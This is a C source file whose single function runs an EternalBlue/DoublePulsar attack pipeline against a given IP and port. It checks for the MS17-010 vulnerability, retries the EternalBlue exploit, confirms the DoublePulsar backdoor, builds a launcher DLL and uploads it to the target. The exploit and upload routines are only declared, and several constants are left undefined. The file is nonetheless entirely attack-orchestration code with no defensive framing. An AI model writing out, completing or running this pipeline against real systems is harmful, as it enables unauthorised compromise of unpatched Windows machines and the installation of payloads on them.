#include <stdio.h>

extern int ms17_vuln_status(const char *ip, int port);
extern int EternalBlue(const char *ip, int port);
extern int doublepulsar_check(const char *ip, int port);
extern int build_launcher_dll(const char *binary_path, const char *dll_out_path);
extern int upload_payload(const char *ip, int port, const char *payload_path, int payload_type);

int execute_eternalblue(const char *ip, int port, const char *payload_path)
{
    int attempt;

    (void)payload_path;

    printf("Checking MS17 vulnerability status...\n");
    if (ms17_vuln_status(ip, port) <= 0) {
        printf("Target is not vulnerable.\n");
        return -1;
    }

    printf("Attempting EternalBlue exploitation...\n");
    for (attempt = 0; attempt < MAX_RETRIES; ++attempt) {
        printf("EternalBlue attempt %d of %d...\n", attempt + 1, MAX_RETRIES);
        if (EternalBlue(ip, port) == 0) {
            break;
        }
    }
    if (attempt == MAX_RETRIES) {
        printf("All EternalBlue attempts failed.\n");
        return -2;
    }

    printf("Checking DoublePulsar status...\n");
    if (doublepulsar_check(ip, port) <= 0) {
        printf("DoublePulsar is not active.\n");
        return -3;
    }

    printf("Building launcher DLL...\n");
    if (build_launcher_dll(TARGET_BINARY, PAYLOAD_DLL_PATH) != 0) {
        printf("Failed to build launcher DLL.\n");
        return -4;
    }

    printf("Uploading payload...\n");
    if (upload_payload(ip, port, PAYLOAD_DLL_PATH, 1) != 0) {
        printf("Failed to upload payload.\n");
        return -5;
    }

    printf("EternalBlue pipeline completed successfully.\n");
    return 0;
}